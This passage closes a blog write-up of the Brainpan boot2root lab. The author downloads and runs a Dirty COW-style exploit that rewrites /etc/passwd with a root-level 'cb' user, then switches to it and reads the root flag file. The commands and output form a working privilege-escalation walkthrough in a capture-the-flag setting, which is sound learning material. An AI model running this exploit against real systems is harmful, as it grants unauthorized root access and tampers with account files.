</span></span><span style=display:flex><span>Saving to: <span style=color:#e6db74>`</span>dirty<span style=color:#e6db74>&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>100%[======================================&gt;] 1,289,712   --.-K/s   in 0.01s   
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>2020-12-22 23:02:59 (104 MB/s) - `dirty&#39;</span> saved <span style=color:#f92672>[</span>1289712/1289712<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>puck@brainpan:~$ ls
</span></span><span style=display:flex><span>checksrv.sh  dirty  linpeas.sh  web
</span></span><span style=display:flex><span>puck@brainpan:~$ chmod +x dirty
</span></span><span style=display:flex><span>puck@brainpan:~$ ./dirty <span style=color:#e6db74>&#39;vu1n3r4b13&#39;</span>
</span></span><span style=display:flex><span>/etc/passwd successfully backed up to /tmp/passwd.bak
</span></span><span style=display:flex><span>Please enter the new password: vu1n3r4b13
</span></span><span style=display:flex><span>Complete line:
</span></span><span style=display:flex><span>cb:fiLqOIF8ICzyk:0:0:pwned:/root:/bin/bash
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>mmap: b773e000
</span></span></code></pre></div><p>Executing the coommand output the <code>cb</code> user I had expected and it was time to see if my exploit worked.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>puck@brainpan:~$ su cb
</span></span><span style=display:flex><span>Password: 
</span></span><span style=display:flex><span>cb@brainpan:/home/puck# cd /root
</span></span><span style=display:flex><span>cb@brainpan:~# pwd
</span></span><span style=display:flex><span>/root
</span></span><span style=display:flex><span>cb@brainpan:~# ls
</span></span><span style=display:flex><span>b.txt
</span></span><span style=display:flex><span>cb@brainpan:~# cat b.txt 
</span></span><span style=display:flex><span>_|                            _|                                        
</span></span><span style=display:flex><span>_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
</span></span><span style=display:flex><span>_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
</span></span><span style=display:flex><span>_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
</span></span><span style=display:flex><span>_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
</span></span><span style=display:flex><span>                                            _|                          
</span></span><span style=display:flex><span>                                            _|
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                                              http://www.techorganic.com 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>cb@brainpan:~#
</span></span></code></pre></div><p>SUCCESS! My <code>cb</code> user had root permissions and I was able to reach the <code>/root</code> directory where I happily viewed the <code>b.txt</code> file.</p><h2 id=summary>Summary <a href=#summary class=anchor>üîó</a></h2><p>This host ended up being a rollercoaster having a twist at effectively every step of the attack. I especially enjoyed being able to leverage and old smash-the-stack overflow to gain initial access. To date, this is my favorite boot2root that I&rsquo;ve had the pleasure of working through.</p></div><div class=tags><a href=https://ncatelli.github.io/tags/ctf>ctf</a>
<a href=https://ncatelli.github.io/tags/boot2root>boot2root</a>
<a href=https://ncatelli.github.io/tags/hacking>hacking</a>
<a href=https://ncatelli.github.io/tags/writeup>writeup</a>
<a href=https://ncatelli.github.io/tags/tryhackme>tryhackme</a></div></section></main><footer id=footer><div id=social><a class=symbol href=https://github.com/ncatelli/ rel=me target=_blank><svg fill="#bbb" width="28" height="28" viewBox="0 0 72 72" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><title>Github</title><desc>Created with Sketch.</desc><defs/><g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><g id="Social-Icons---Rounded-Black" transform="translate(-264.000000, -939.000000)"><g id="Github" transform="translate(264.000000, 939.000000)"><path d="M8 72H64c4.418278.0 8-3.581722 8-8V8c0-4.418278-3.581722-8-8-8H8c-4.418278 811624501e-24-8 3.581722-8 8V64c541083001e-24 4.418278 3.581722 8 8 8z" id="Rounded" fill="#bbb"/><path d="M35.9985 13C22.746 13 12 23.7870921 12 37.096644c0 10.6440272 6.876 19.6751861 16.4145 22.8617681C29.6145 60.1797862 30.0525 59.4358488 30.0525 58.7973276 30.0525 58.2250681 30.0315 56.7100863 30.0195 54.6996482c-6.6765 1.4562499-8.085-3.2302544-8.085-3.2302544-1.0905-2.7829884-2.664-3.5239139-2.664-3.5239139C17.091 46.4500754 19.4355 46.4801943 19.4355 46.4801943c2.4075.1701719 3.675 2.4833051 3.675 2.4833051 2.142 3.6820383 5.6175 2.6188404 6.9855 2.0014024C30.3135 49.4077535 30.9345 48.3460615 31.62 47.7436831 26.2905 47.1352808 20.688 45.0691228 20.688 35.8361671c0-2.6308879.9345-4.781379 2.4705-6.4665327C22.911 28.7597262 22.0875 26.3110578 23.3925 22.9934585c0 0 2.016-.6475568 6.6 2.4697516C31.908 24.9285993 33.96 24.6620468 36.0015 24.6515052 38.04 24.6620468 40.0935 24.9285993 42.0105 25.4632101c4.581-3.1173084 6.5925-2.4697516 6.5925-2.4697516C49.9125 26.3110578 49.089 28.7597262 48.8415 29.3696344 50.3805 31.0547881 51.309 33.2052792 51.309 35.8361671c0 9.2555448-5.6115 11.29309-10.9575 11.8894446.860999999999997.7439374 1.629 2.2137408 1.629 4.4621184C41.9805 55.4089489 41.9505 58.0067059 41.9505 58.7973276 41.9505 59.4418726 42.3825 60.1918338 43.6005 59.9554002 53.13 56.7627944 60 47.7376593 60 37.096644 60 23.7870921 49.254 13 35.9985 13" fill="#fff"/></g></g></g></svg></a></div><div class=copyright></div></footer></body></html>